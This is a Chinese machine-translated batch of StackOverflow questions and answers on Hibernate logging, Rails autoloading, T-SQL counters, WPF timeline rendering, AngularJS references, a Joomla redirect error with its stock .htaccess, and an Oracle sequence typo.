# StackOverflow 问答 15533000-15533999

# java - 禁用休眠输出

> ID：15533003
> 
> 赞同：0
> 
> 时间：2013-03-20T19:33:17.810
> 
> 标签：java, hibernate, logging, desktop-application

我正在开发使用 Hibernate 3 的 Java 桌面应用程序。一切正常，但是当我运行我的应用程序时，我的输出充满了如下行：

```
mar 20, 2013 8:26:07 PM org.hibernate.cfg.annotations.Version <clinit>
INFO: Hibernate Annotations 3.3.1.GA
mar 20, 2013 8:26:07 PM org.hibernate.cfg.Environment <clinit>
INFO: Hibernate 3.2.5
mar 20, 2013 8:26:07 PM org.hibernate.cfg.Environment <clinit>
INFO: hibernate.properties not found
mar 20, 2013 8:26:07 PM org.hibernate.cfg.Environment buildBytecodeProvider
INFO: Bytecode provider name : cglib
mar 20, 2013 8:26:07 PM org.hibernate.cfg.Environment <clinit>
INFO: using JDK 1.4 java.sql.Timestamp handling
mar 20, 2013 8:26:07 PM org.hibernate.ejb.Version <clinit>
INFO: Hibernate EntityManager 3.3.2.GA
mar 20, 2013 8:26:08 PM org.hibernate.cfg.AnnotationBinder bindClass
INFO: Binding entity from annotated class: persistence.Document
mar 20, 2013 8:26:08 PM org.hibernate.cfg.annotations.QueryBinder bindQuery
INFO: Binding Named query: Document.findAll => SELECT d FROM Document d
mar 20, 2013 8:26:08 PM org.hibernate.cfg.annotations.QueryBinder bindQuery
INFO: Binding Named query: Document.findById => SELECT d FROM Document d WHERE d.id = :id
mar 20, 2013 8:26:08 PM org.hibernate.cfg.annotations.QueryBinder bindQuery
INFO: Binding Named query: Document.findByUrl => SELECT d FROM Document d WHERE d.url = :url
mar 20, 2013 8:26:09 PM org.hibernate.cfg.annotations.EntityBinder bindTable
INFO: Bind entity persistence.Document on table DOCUMENTS
mar 20, 2013 8:26:09 PM org.hibernate.cfg.AnnotationBinder bindClass
INFO: Binding entity from annotated class: persistence.LanguageEntry
mar 20, 2013 8:26:09 PM org.hibernate.cfg.annotations.QueryBinder bindQuery
INFO: Binding Named query: LanguageEntry.findAll => SELECT l FROM LanguageEntry l
mar 20, 2013 8:26:09 PM org.hibernate.cfg.annotations.QueryBinder bindQuery
INFO: Binding Named query: LanguageEntry.findById => SELECT l FROM LanguageEntry l WHERE l.id = :id 
```

我怎样才能禁用它？将非常感谢任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:36:20.897

请参阅下面的先前答案：

[无法禁用休眠日志消息](https://stackoverflow.com/questions/4114410/unable-to-disable-hibernate-log-messages)

看起来就像在运行时向 java 命令行添加 -Dlog4j.debug 选项一样简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:41:45.153

尝试放入 `hibernate.show_sql = false`休眠属性

# ruby - Rails lib 类未在生产中加载，在开发中工作正常

> ID：15533006
> 
> 赞同：3
> 
> 时间：2013-03-20T19:33:28.577
> 
> 标签：ruby, ruby-on-rails-3.2, jruby

我在 lib 目录中有一个类：lib\db_cache.rb，它定义了类 DbCache。

我的 Rails 模型可以在开发模式下以及在生产模式下运行 rails 控制台时访问它。

但是当我运行生产模式 Rails 服务器时，模型类，例如 Foo，抱怨“未初始化的常量”Foo::DbCache，

```
org/jruby/RubyModule.java:2677:in `const_missing', 
org/jruby/RubyMethod.java:134:in `call' 
```

我在 application.rb 中有这一行

```
config.autoload_paths += %W(#{Rails.root}/lib) 
```

我还尝试了链接的 SO 问题中显示的其他变体 - 但没有任何乐趣。

我在 Linux 上使用 jruby 1.7.3 (1.9.3p385) - Java 1.7.0_13-b20。Rails 是 3.2.12 版本。

我已经看到这些问题[Rails - 为什么 RAILS_ROOT/lib 中的模型在生产模式下不可用？](https://stackoverflow.com/questions/2872450/rails-why-would-a-model-inside-rails-root-lib-not-be-available-in-production-m)以及[从 Rails 3 中的 lib 文件夹加载模块/类的最佳方法？](https://stackoverflow.com/questions/3356742/best-way-to-load-module-class-from-lib-folder-in-rails-3)但这似乎对我的情况没有帮助。

提前感谢您对此的任何想法。

PS我现在的解决方法是在我的模型类中要求'db_cache':(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-20T01:30:42.070

听起来您正在尝试扩展一个类。如果没有看到 db_cache.rb 文件，我无法确定。

如果是这样的话，那就太好了

```
extend DbCache 
```

在您的模型类定义中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-20T17:54:23.030

该问题似乎与启用 config.threadsafe 相关！在 /config/environments/production.rb

这就是我所拥有的：

```
 # Enable threaded mode
  if defined?(Rails::Server)
    puts "Rails Server running - so enable threadsafe!"
    config.threadsafe!
  end 
```

当我使用 jruby 时，我认为这不是什么大问题。至少，当我删除这些行时，事情会变得更好:)

# sql-server - 反柱；将表中的行除以 nrows

> ID：15533008
> 
> 赞同：2
> 
> 时间：2013-03-20T19:33:31.013
> 
> 标签：sql-server, tsql

我正在努力解决以下问题：

```
Counter --- Period ---
 1         2012-02-09 
 1         2012-02-09 
 1         2012-02-08 
 2         2012-02-07 
 2         2012-02-07
 2         2012-02-07 
 3         2012-02-06
 3         2012-02-06 
```

我不知道要使用什么函数或如何添加一个计数器列，它将表中的周期行除以 3 并添加一个计数。它将划分直到它可以并将剩余的行分配为下一个计数器（如上所示）。在上面的示例中，@n 为 3，因此它计算每个周期分配 1 直到 3 完成并计数。

我看过 NTILE 不起作用，因为它只是将它分成 n 组。

帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:08:19.120

您是否正在寻找类似的东西：

```
declare @n as int = 3

SELECT
((ROW_NUMBER() over (order by period desc) - 1) / @n) + 1 as counter,
[period]
FROM [a].[dbo].[a] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T19:41:07.580

您可能需要澄清您的问题；如果我使用`NTILE()`我会得到您正在寻找的结果（如果您包含 ID）：

```
declare @tableA table(id int identity, col1 date)

insert into @tableA values ('2012-02-09')
insert into @tableA values ('2012-02-09')
insert into @tableA values ('2012-02-08')
insert into @tableA values ('2012-02-07')
insert into @tableA values ('2012-02-07')
insert into @tableA values ('2012-02-07')
insert into @tableA values ('2012-02-06')
insert into @tableA values ('2012-02-06')

select ntile(3) over (order by id) counter, col1 Period from @tableA 
```

结果：

```
counter              Period
-------------------- ----------
1                    2012-02-09
1                    2012-02-09
1                    2012-02-08
2                    2012-02-07
2                    2012-02-07
2                    2012-02-07
3                    2012-02-06
3                    2012-02-06 
```

# haskell - Haskell - 过滤函数中的布尔函数

> ID：15533013
> 
> 赞同：-1
> 
> 时间：2013-03-20T19:33:40.150
> 
> 标签：haskell, filter

但我无法管理它。

```
chsr :: [[String]] ->  [(Int,Int)] ->[(Int,Int)]
chsr xs ts = filter(control xs)???? 
```

我该怎么做这部分？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T19:47:33.337

在你学习的过程中，我会用更多的问题来回答你的问题。

1.  应该有什么类型`????`？

2.  你的`chsr`函数有那种类型的参数吗？它是什么/它们是什么？

3.  如果您将 替换`????`为该值/其中一个值，您的函数会做正确的事情吗？

# c# - 当图像超过 40,000 宽时，渲染图像失败

> ID：15533014
> 
> 赞同：2
> 
> 时间：2013-03-20T19:33:42.070
> 
> 标签：c#, wpf, image, bitmap, png

我正在尝试像这样在 Adob​​e Premiere 中创建时间刻度： ![在此处输入图像描述](../Images/e009c35b7370703a8a523e948300bc68.png) 但是，我必须降低到 0.01 秒的增量。

我的时间线控件如下所示： ![在此处输入图像描述](../Images/231a21320091f2cb913732d91bf53846.png)

**更新：** 我使用了@Sten Petrov 的建议并使用了`VisualBrush`.

但是现在我被困在如何实现`Label`秒数上。

我的新代码（包含控件可以更改）：

```
<Window x:Class="WpfApplication3.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="MainWindow" Height="350" Width="680.839">
<Grid Background="Black">

    <ScrollViewer VerticalScrollBarVisibility="Disabled" HorizontalScrollBarVisibility="Visible" >
        <ScrollViewer.ContentTemplate>
            <DataTemplate>
                <Grid>
                    <Grid.RowDefinitions>
                        <RowDefinition Height="30"/>
                        <RowDefinition Height="1*"/>
                    </Grid.RowDefinitions>

                    <Grid SnapsToDevicePixels="False" UseLayoutRounding="True">
                        <Grid.Background>
                            <VisualBrush TileMode="Tile" Viewport="0,0,5,30" ViewportUnits="Absolute" Viewbox="0,0,5,30" ViewboxUnits="Absolute">
                                <VisualBrush.Visual>
                                    <Line Stroke="Coral" StrokeThickness="2" X1="0" X2="0" Y1="25" Y2="30" UseLayoutRounding="True" />
                                </VisualBrush.Visual>
                            </VisualBrush>
                        </Grid.Background>
                    </Grid>

                    <Grid Margin="50,0,0,0" SnapsToDevicePixels="False" UseLayoutRounding="True">
                        <Grid.Background>
                            <VisualBrush TileMode="Tile" Viewport="0,0,50,30" ViewportUnits="Absolute" Viewbox="0,0,50,30" ViewboxUnits="Absolute">
                                <VisualBrush.Visual>
                                    <Line Stroke="Red" StrokeThickness="2" X1="0" X2="0" Y1="20" Y2="30" UseLayoutRounding="True" />
                                </VisualBrush.Visual>
                            </VisualBrush>
                        </Grid.Background>
                    </Grid>

                    <Grid SnapsToDevicePixels="False" Height="30" UseLayoutRounding="True" >
                        <Grid.Background>
                            <VisualBrush TileMode="Tile" Viewport="0,0,500,30" ViewportUnits="Absolute" Viewbox="0,0,500,30" ViewboxUnits="Absolute">
                                <VisualBrush.Visual>
                                    <Grid HorizontalAlignment="Left" Width="500" UseLayoutRounding="True">
                                        <Grid.ColumnDefinitions>
                                            <ColumnDefinition Width="21*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="25*"/>
                                            <ColumnDefinition Width="20*"/>
                                            <ColumnDefinition Width="9*"/>
                                        </Grid.ColumnDefinitions>
                                        <Grid.RowDefinitions>
                                            <RowDefinition Height="15"/>
                                            <RowDefinition Height="1*"/>
                                        </Grid.RowDefinitions>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="1" Height="9" Content=".100" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="2" Height="9" Content=".200" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="3" Height="9" Content=".300" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="4" Height="9" Content=".400" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="5" Height="9" Content=".500" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="6" Height="9" Content=".600" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="7" Height="9" Content=".700" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="8" Height="9" Content=".800" Foreground="White"/>
                                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="9" Height="9" Content=".900" Foreground="White"/>
                                    </Grid>
                                </VisualBrush.Visual>
                            </VisualBrush>
                        </Grid.Background>
                    </Grid>

                    <Grid SnapsToDevicePixels="False" Height="30" UseLayoutRounding="True" Margin="500,0,0,0" >
                        <Grid.Background>
                            <VisualBrush TileMode="Tile" Viewport="0,0,500,30" ViewportUnits="Absolute" Viewbox="0,0,500,30" ViewboxUnits="Absolute">
                                <VisualBrush.Visual>
                                    <Line Stroke="Blue" StrokeThickness="2" X1="0" X2="0" Y1="10" Y2="30" UseLayoutRounding="True" />
                                </VisualBrush.Visual>
                            </VisualBrush>
                        </Grid.Background>
                    </Grid>

                    <Grid SnapsToDevicePixels="False" Height="30" UseLayoutRounding="True" Margin="491,0,0,0" >
                        <Grid.RowDefinitions>
                            <RowDefinition Height="7"/>
                            <RowDefinition Height="23"/>
                        </Grid.RowDefinitions>
                        <!--Need something here-->
                        <Label Grid.Row="0" FontFamily="Tahoma" FontSize="8" Padding="0" VerticalAlignment="Bottom" Grid.Column="0" Height="9" Content="00:00" Foreground="White"/>
                    </Grid>

                </Grid>
            </DataTemplate>
        </ScrollViewer.ContentTemplate>
    </ScrollViewer>

</Grid> 
```

**/更新**

我每行 0.01 秒，所以对于 10 分钟的时间线，我正在查看绘制 60000 行 + 6000 个标签。

我之前问过一个问题：[10000 多个 UI 元素，绑定还是绘制？](https://stackoverflow.com/questions/13314889/10000s-ui-elements-bind-or-draw)

最初我是直接在`Canvas`. 然后我去使用a `VisualHost`，因为它应该更轻。

好吧，它不够轻。

我有一个`MediaElement`播放视频的视频，时间轴与视频位置同步滚动。A`ScrollViewer`包裹我的时间线，`.ScrollToHorizontalOffset`大约每 10 毫秒执行一次。

如果我的时间线超过 3 分钟，视频就会关闭。我认为这是因为其中`VisualHost`仍然包含所有框架元素，并且滚动导致它们被重新验证。

所以现在我正在尝试生成一个`Image`显示，我认为应该更轻。

我在这个假设上错了吗？

现在我正面临将时间线制作成`Image`.

我无法将整个时间线渲染为图像，因此我将其“分块”。我在`Exceptions`说图像尺寸太大了。

关于我的代码：这是我的主要入口点。

```
public void RenderHeaderPicture()
{
    const int ChunkSize = 5000;
    var bitmapFrames = new List<BitmapFrame>();

    // generates X number of DrawingVisual's based on ChunkSize
    List<DrawingVisual> visuals = generateHeaderVisualChunks(
        AppViewModel.TimelineViewModel.HeaderWidth, ChunkSize, TimelineViewModel.ViewLevel.Level1);

    for (var i = 0; i < visuals.Count; i++)
    {
        var renderTargetBitmap = new RenderTargetBitmap(ChunkSize, 30, 96, 96, PixelFormats.Pbgra32);
        renderTargetBitmap.Render(visuals[i]);

        //test to make sure image good
        saveHeaderSegmentAsPng(string.Format("headerSeg{0}.png", i), renderTargetBitmap);

        bitmapFrames.Add(BitmapFrame.Create(renderTargetBitmap));
    }

    // put the frames back together now
    var drawingVisual = new DrawingVisual();
    using (var drawingContext = drawingVisual.RenderOpen())
    {
        for (int i = 0; i < bitmapFrames.Count; i++)
        {
            drawingContext.DrawImage(bitmapFrames[i], new Rect(i * ChunkSize, 0, bitmapFrames[i].PixelWidth, 30));
        }
        drawingContext.Close();
    }

    var newBmp = new RenderTargetBitmap(AppViewModel.TimelineViewModel.HeaderWidth, 30, 96, 96, PixelFormats.Pbgra32);
    newBmp.Render(drawingVisual);

    AppViewModel.TimelineViewModel.HeaderImageSource = newBmp;
} 
```

这是创建`DrawingVisual's`

```
private List<DrawingVisual> generateHeaderVisualChunks(int width, int chunkSize, TimelineViewModel.ViewLevel level) 
{ 
    var ret = new List<DrawingVisual>();

    var currentTime = new TimeSpan(0, 0, 0, 0, 0);
    var timeStep = new TimeSpan(0, 0, 0, 0, (int)level);
    var currentLine = 0;

    const double DistanceBetweenLines = 5;
    const int TenthOfSecondLine = 10;
    const int SecondLine = 100;

    int iterations = (width / chunkSize);
    int remainder = width % chunkSize; //not doing anything with yet

    var grayBrush = new SolidColorBrush(Color.FromRgb(192, 192, 192));
    var grayPen = new Pen(grayBrush, 2);
    var whitePen = new Pen(Brushes.Purple, 2);

    grayBrush.Freeze();
    grayPen.Freeze();
    whitePen.Freeze();

    for (int i = 0; i < iterations; i++)
    {
        var visual = new DrawingVisual();
        using (var dc = visual.RenderOpen())
        {
            double currentX = 0;

            if (i > 0)
            {
                currentLine--;
                currentTime -= timeStep;
            }

            while (currentX <= chunkSize)
            {
                if (((currentLine % SecondLine) == 0) && currentLine != 0)
                {
                    dc.DrawLine(whitePen, new Point(currentX, 30), new Point(currentX, 15));
                    FormattedText text = null;
                    double tempX = currentX;
                    switch (level)
                    {
                        case TimelineViewModel.ViewLevel.Level1:
                            text = new FormattedText(
                                    currentTime.ToString(@"hh\:mm\:ss\.fff"),
                                    CultureInfo.CurrentCulture,
                                    FlowDirection.LeftToRight,
                                    new Typeface("Tahoma"),
                                    8,
                                    grayBrush);
                            break;
                    }

                    dc.DrawText(text, new Point((tempX - 22), 0));
                }
                else if ((((currentLine % TenthOfSecondLine) == 0) && currentLine != 0)
                            && (currentLine % SecondLine) != 0)
                {
                    dc.DrawLine(grayPen, new Point(currentX, 30), new Point(currentX, 20));

                    FormattedText text = null;
                    switch (level)
                    {
                        case TimelineViewModel.ViewLevel.Level1:
                            text = new FormattedText(
                                    string.Format(".{0}", currentTime.Milliseconds),
                                    CultureInfo.CurrentCulture,
                                    FlowDirection.LeftToRight,
                                    new Typeface("Tahoma"),
                                    8,
                                    grayBrush);
                            break;
                    }

                    dc.DrawText(text, new Point((currentX - 8), 8));
                }
                else
                {
                    dc.DrawLine(grayPen, new Point(currentX, 30), new Point(currentX, 25));
                }

                currentX += DistanceBetweenLines;
                currentLine++;
                currentTime += timeStep;
            }
        }
        ret.Add(visual);
    }
    return ret;
} 
```

保存 png 片段：

```
private static void saveHeaderSegmentAsPng(string fileName, RenderTargetBitmap renderTargetBitmap)
{
    var pngBitmapEncoder = new PngBitmapEncoder();

    pngBitmapEncoder.Frames.Add(BitmapFrame.Create(renderTargetBitmap));
    using (var fileStream = new FileStream(fileName, FileMode.Create))
    {
        pngBitmapEncoder.Save(fileStream);
        fileStream.Flush();
        fileStream.Close();
    }
} 
```

我所有的 png 片段都在其单独的文件中正确呈现。我的时间线一直正确渲染，直到我超过 1:20 然后事情就中断了。

看： ![在此处输入图像描述](../Images/7f0798ef52392ede285edfbd6a244497.png)

这就像图像被涂抹或其他东西。有谁知道这是怎么回事？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T23:26:05.760

我正在等待我的客厅将有一台水平分辨率的电视的那一天，这将需要像你这样的方法。

废弃你刚刚在这里演示的整段代码，它永远不会变得可用*和*可维护，你只能设法从中挤出其中的一个。

然后了解[VisualBrush](http://www.c-sharpcorner.com/uploadfile/raj1979/visual-brush-in-wpf/)，那里有很多教程，它可以重复你的视觉模板，不需要 PNG，当屏幕分辨率改变时它会更好地缩放（高达 40001px 宽）

对于出现在标记上方的数字，有一百万种不同的方法，其中一些可以与上面提到的视觉画笔结合使用，例如代表您的时间线单元（两个较大标记之间的空间）的用户控件。现在将其中的几个放在一个网格中（堆栈面板、画布……如您所愿）并（动态地）调整它们的偏移量和标签 - 突然之间，您可以在屏幕上用 10 个控件表示一个无限的时间线。

# javascript - AngularJS - 为什么在更改引用它的变量时 $scope.property 的值会发生变化

> ID：15533015
> 
> 赞同：0
> 
> 时间：2013-03-20T19:33:53.850
> 
> 标签：javascript, angularjs

所以我`$scope.property`通过将 a 定义为另一个变量的值来复制它`var query`，并且当我更新它的值时`var query`会改变`$scope.property`.

为什么会发生这种情况，我该如何避免这种情况？

我的代码看起来像这样：

```
var query = $scope.property;
if(condition) {
    console.log($scope.property);
    $.extend(query, anotherObj);
    console.log($scope.property);
} 
```

控制台中的输出如下所示：

```
> Object {details-type: "order", details-bind_date_formatted: "03/19/2013"}
> Object {details-type: "order", details-bind_date_formatted: "03/19/2013", details-state: "CA"} 
```

我从未在 vanilla javascript 中遇到过这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:54:27.853

> 为什么会发生这种情况

你注意到了`query === $scope.property`吗？两者都引用完全相同的对象，您可以在两个日志语句之间进行更改。

> 我怎样才能避免这种情况？

How do you want to avoid this? Do you expect `query` to be a clone of the object? Then see [How do I correctly clone a JavaScript object?](https://stackoverflow.com/q/728360/1048572) or [What is the most efficient way to deep clone an object in JavaScript?](https://stackoverflow.com/q/122102/1048572) for that.

> I've never encountered this problem in vanilla javascript.

Unlikely, since jQuery is only built of vanilla JS:

```
var scope = {a:{b:1}};
var a = scope.a;
console.log(scope.a); // or just log(a);
a.c = 0; // or scope.a.c = 0;
console.log(scope.a); // or just log(a); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-06-13T08:35:41.607

```
var query = angular.copy($scope.property); 
```

# javascript - 使用 JQuery/Javascript 实现烟雾效果

> ID：15533016
> 
> 赞同：3
> 
> 时间：2013-03-20T19:33:57.917
> 
> 标签：javascript, jquery

我访问了一个背景为美丽烟雾效果的网站（[www.steaw-webdesign.com](http://www.steaw-webdesign.com)）。即使我想到 Javascript 和 JQuery，我也没有成功识别出这种效果背后的技术。效果应用于 div。

我想做类似的事情，但我不知道怎么做，有什么教程或建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:58:58.733

他们正在使用 HTML5 视频元素

**只需使用id="video"**转到 div （`<footer>`标签下方）

`<div id="video"><img/>` **`<video>`**

你会找到`<video>`带有 src 文件的元素

> `<video id="jp_video_0" preload="auto" style="width: 1263px; height: auto;" src="/wp-content/themes/steaw/videos/video_bg.mp4"></video>`

# linux - 将 CentOS 转换为 Ubuntu？

> ID：15533017
> 
> 赞同：-2
> 
> 时间：2013-03-20T19:33:58.433
> 
> 标签：linux, ubuntu, centos

**大家好。** 我最近购买了一个 CentOS 5.3 的 VPS！

但是，我希望它在 Ubuntu 上运行。如何将系统转换为 Ubuntu？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:39:41.630

只需安装 Ubuntu；已经安装了什么并不重要。

如果您关心的机器上有任何数据，请先备份。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:41:13.167

我想您能做的最好的事情就是询问您购买 VPS 的公司的系统管理员。他们可能会手动完成并在您可能想要保存的 VPS 上备份数据。您也可以在您的 VPS 提供商的控制面板上访问此选项。在您的 VPS 上手动重新安装操作系统可能会导致很多头痛，我不建议这样做。

# javascript - Joomla 网站上的 javascript 重定向出现 500 错误

> ID：15533018
> 
> 赞同：0
> 
> 时间：2013-03-20T19:34:07.613
> 
> 标签：javascript, redirect, joomla, joomla1.5

我在我的 Joomla 网站上设置了一些 javascript 重定向。如果有人访问 woodridgelibrary.org/zinio，它会将他们重定向到[http://www.woodridgelibrary.org/index.php?option=com_content&view=article&id=247&Itemid=104&Itemid=21](http://www.woodridgelibrary.org/index.php?option=com_content&view=article&id=247&Itemid=104&Itemid=21)。直到昨天它工作得很好。现在所有重定向都会给出 500 Internal Server Error。我没有更改后端的任何选项，也没有触及脚本。我检查以确保 URL 没有更改。

奇怪的是，如果我使用 iPhone 和 4G，重定向确实有效。它们不适用于无线。

我正在使用的脚本是：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>

  <script language="javascript" type="text/javascript">
<!--// /
var delay = 0; // Delay in seconds
var targetURL = "http://www.woodridgelibrary.org/index.php?option=com_content&view=article&id=266&Itemid=26"; // URL to load
setTimeout('self.location.replace(targetURL)', (delay * 1));
//-->
  </script>
  <meta http-equiv="refresh" content="15;URL=http://www.woodridgelibrary.org/index.php?option=com_content&view=article&id=266&Itemid=26">
  <title>Redirect</title>

</head>

<body>

<p></p>

</body>
</html> 
```

任何想法可能是什么问题？

.htaccess 是

```
#RewriteEngine On
########## Begin - Joomla! core SEF Section
#
#RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
#
# If the requested path and file is not /index.php and the request
# has not already been internally rewritten to the index.php script
#RewriteCond %{REQUEST_URI} !^/index\.php
# and the request is for root, or for an extensionless URL, or the
# requested URL ends with one of the listed extensions
#RewriteCond %{REQUEST_URI} (/[^.]*|\.(php|html?|feed|pdf|raw))$ [NC]
# and the requested path and file doesn't directly match a physical file
#RewriteCond %{REQUEST_FILENAME} !-f
# and the requested path and file doesn't directly match a physical folder
#RewriteCond %{REQUEST_FILENAME} !-d
# internally rewrite the request to the index.php script
#RewriteRule .* index.php [L]
#

##
# @version $Id: htaccess.txt 14401 2010-01-26 14:10:00Z louis $
# @package Joomla
# @copyright Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
# @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
# Joomla! is Free Software
##

#####################################################
#  READ THIS COMPLETELY IF YOU CHOOSE TO USE THIS FILE
#
# The line just below this section: 'Options +FollowSymLinks' may cause problems
# with some server configurations.  It is required for use of mod_rewrite, but may already
# be set by your server administrator in a way that dissallows changing it in
# your .htaccess file.  If using it causes your server to error out, comment it out (add # to
# beginning of line), reload your site in your browser and test your sef url's.  If they work,
# it has been set by your server administrator and you do not need it set here.
#
#####################################################

##  Can be commented out if causes errors, see notes above.
#Options +FollowSymLinks

#
#  mod_rewrite in use

RewriteEngine On

########## Begin - Rewrite rules to block out some common exploits
## If you experience problems on your site block out the operations listed below
## This attempts to block the most common type of exploit `attempts` to Joomla!
#

## Deny access to extension xml files (uncomment out to activate)
#<Files ~ "\.xml$">
#Order allow,deny
#Deny from all
#Satisfy all
#</Files>

## End of deny access to extension xml files
RewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\%3D) [OR]
# Block out any script trying to base64_encode crap to send via URL
RewriteCond %{QUERY_STRING} base64_encode.*\(.*\) [OR]
# Block out any script that includes a <script> tag in URL
RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
# Block out any script trying to set a PHP GLOBALS variable via URL
RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
# Block out any script trying to modify a _REQUEST variable via URL
RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
# Send all blocked request to homepage with 403 Forbidden error!
RewriteRule ^(.*)$ index.php [F,L]
#
########## End - Rewrite rules to block out some common exploits

#  Uncomment following line if your webserver's URL
#  is not directly related to physical file paths.
#  Update Your Joomla! Directory (just / for root)

# RewriteBase /

########## Begin - Joomla! core SEF Section
#
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_URI} !^/index.php
RewriteCond %{REQUEST_URI} (/|\.php|\.html|\.htm|\.feed|\.pdf|\.raw|/[^.]*)$  [NC]
RewriteRule (.*) index.php
RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization},L]
#
########## End - Joomla! core SEF Section 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-04-12T21:25:02.333

创建一个未发布的新菜单

更好的方法是使用发布在不存在位置的模块，这样您就可以使用菜单参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T21:30:35.567

如果我可以提供替代解决方案，我通常会使用隐藏的菜单项创建此类重定向。

1.  通过模块或模板创建*未在站点中发布的新菜单。*
2.  在该菜单中使用您想要的别名（例如“zinio”）创建一个项目，并将其指向您的文章。

而已。没有大惊小怪，没有混乱。Joomla 2.5 还有一个重定向组件，可以做你想做的事。

# oracle - ORA-00904: "DWH_ITEM_SEQ"."NEXTAVL": 标识符无效

> ID：15533021
> 
> 赞同：-1
> 
> 时间：2013-03-20T19:34:22.507
> 
> 标签：oracle

谁能向我解释为什么我在运行以下命令时出现 00904 错误，我需要在表中插入 100 行，但我不知道为什么会出现错误

```
 drop table DWH_ITEM_DIM;
 CREATE TABLE DWH_ITEM_DIM(
 ITEM_ID NUMBER NOT NULL,
 ITEM_NAME VARCHAR2(5) NOT NULL,
 ITEM_TYPE VARCHAR2(1) NOT NULL,
 ITEM_COST NUMBER(10,2) NOT NULL,
 ITEM_PRICE NUMBER(10,2) NOT NULL,
 ITEM_FOR_SALE VARCHAR2(1) NOT NULL,
 CONSTRAINT ITEM_ID_PK PRIMARY KEY (ITEM_ID));

  DROP SEQUENCE DWH_ITE_SEQ;
 CREATE SEQUENCE DWH_ITE_SEQ
 START WITH 1
 INCREMENT BY 1
 NOCACHE
 NOCYCLE;

 TRUNCATE TABLE DWH_ITEM_DIM;
 INSERT INTO DWH_ITEM_DIM
 SELECT DWH_ITE_SEQ.NEXTAVL AS ITEM_ID,
 DBMS_RANDOM.STRING('U',5) AS ITEM_NAME,
 DBMS_RANDOM.STRING('U',1) AS ITEM_TYPE,
 ROUND(dbms_random.value(LOW =>25,HIGH =>300),2) AS ITEM_COST,
 ROUND(dbms_random.value(LOW =>25,HIGH =>300),2) AS ITEM_PRICE,
 DBMS_RANDOM.STRING('U',1) AS ITEM_FOR_SALE
 FROM DUAL
 CONNECT BY LEVEL <= 100;
 COMMIT; 
```

当我运行它时，“脚本输出”是：

```
table DWH_ITEM_DIM dropped.
table DWH_ITEM_DIM created.
sequence DWH_ITE_SEQ dropped.
sequence DWH_ITE_SEQ created.
table DM.DWH_ITEM_DIM truncated.

Error starting at line 19 in command:
INSERT INTO DM.DWH_ITEM_DIM
 SELECT DWH_ITE_SEQ.NEXTAVL AS ITEM_ID,
 DBMS_RANDOM.STRING('U',5) AS ITEM_NAME,
 DBMS_RANDOM.STRING('U',1) AS ITEM_TYPE,
 ROUND(dbms_random.value(LOW =>25,HIGH =>300),2) AS ITEM_COST,
 ROUND(dbms_random.value(LOW =>25,HIGH =>300),2) AS ITEM_PRICE,
 DBMS_RANDOM.STRING('U',1) AS ITEM_FOR_SALE
 FROM DUAL
 CONNECT BY LEVEL <= 100
Error at Command Line:20 Column:8
Error report:
SQL Error: ORA-00904: "DWH_ITE_SEQ"."NEXTAVL": invalid identifier
00904\. 00000 -  "%s: invalid identifier"
*Cause:    
*Action:
commited. 
```

